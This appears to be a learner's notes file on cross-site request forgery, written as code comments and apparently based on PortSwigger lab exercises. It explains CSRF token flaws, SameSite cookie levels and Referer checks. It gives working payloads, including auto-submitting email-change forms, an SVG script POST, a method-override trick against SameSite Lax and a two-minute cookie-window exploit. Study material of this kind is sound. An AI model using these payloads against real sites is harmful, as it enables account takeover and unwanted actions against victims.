// Cross-site request forgery
//! Exploiting CSRF
//* basic payload
// <html>
//  <body>
//    <form action="https://vulnerable-website.com/email/change" method="POST">
//      <input type="hidden" name="email" value="pwned@evil-user.net" />
//    </form>
//    <script>document.forms[0].submit();</script>
//  </body>
// </html>
//* CSRF vis svg
//<svg xmlns="http://www.w3.org/2000/svg">
//  <script type="application/ecmascript">
//    <![CDATA[
//      const email ="admin@attacker.com";
//      const jsonData = JSON.stringify({ email: email });
//      const blob = new Blob([jsonData], { type: '' });
//      const response = fetch('/update_email', {
//          method: 'POST',
//          body: blob,
//          headers: {} // No Content-Type header - key to CSRF vulnerability
//      });
//    ]]>
//  </script>
//</svg>
//! CSRF token
//* present token
// some application forgot totaly about csrf projection if the token is not present
//* token not tied to user session
// Some applications do not validate that the token belongs to the same session as the user who is making the request.
// the result the attacker can use his own token to perform actions on behalf of the victim.
//* token tied to a csrf-key
// if you can find a way to set the csrf-key of the victim to yours you can use your csrf-tokens
//? note :
// if the an application is in the same DNS domains it can set the cookies of the other application like main.example.com and sub.example.com
//* csrf token duplicated in cookies
// when you make a request the server checks if you have the same value in the cookie and in the request body
// if you can change csrf the cookie value of the victim you can bypass this
//! SameSite cookie restrictions
//* what is a site ?
// its the top-level domain plus one additional level and the protocol with them
// http://me.example.com is same site as http://he.example.com
// http://me.example.com is not same site as https://example.com
// http://me.one.com is not same site as http://me.two.com
//* what is an origin ?
// its the protocol, domain and port
// as https://example.com:443 any difference in any part resolves in a different origin
//* SameSite restriction levels
// 1. Strict - the cookie is send only to the same origin
// 2. Lax - the cookie is send to the same site
// 3. None - the cookie is send to any site
//? note:
// in Lax the cookie is only sent on top-level navigations (clicking a link) or a GET request .
//* Bypassing SameSite Lax restrictions using GET requests
// some frameworks provide  a method to averride the method in the reqeust so using this
// <form action="https://vulnerable-website.com/" method="GET">
//     <input type="hidden" name="_method" value="POST">
//     <input type="hidden" name="amount" value="1000000">
// </form>
// the browser will see a GET reqeust with LAX he will send the cookie
// but the server will see a POST
// result we have successfully bypassed the Lax restriction
//* Bypassing SameSite Lax restrictions with newly issued cookies
// if a website doesn't include a SameSite attribute when setting a cookie,
// Chrome automatically applies Lax restrictions by default.
// However, to avoid breaking single sign-on (SSO) mechanisms,
// it doesn't actually enforce these restrictions for the first 120 seconds on top-level POST requests.
// As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.
// if you can trigger the session of the victim to be reset you can exploit this vulnerability
//
// <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
//     <input type="hidden" name="email" value="pwned@portswigger.net">
// </form>
// <p>Click anywhere on the page</p>
// <script>
//     window.onclick = () => {
//         window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
//         setTimeout(changeEmail, 5000);
//     }
//
//     function changeEmail() {
//         document.forms[0].submit();
//     }
// </script>
//! Bypassing Referer-based CSRF defenses
//* Validation of Referer depends on header being present
// Some applications validate the Referer header when it is present in requests
// but skip the validation if the header is omitted.
// use : <meta name="referrer" content="never">
//* weak referer validation
// if the application is only checking if its origin is in the referer you can do something like this
// http://your-website.com/path?application-origin.com
// and add <meta name="referrer" content="unsafe-url" />
// for the browser to not remove the query string

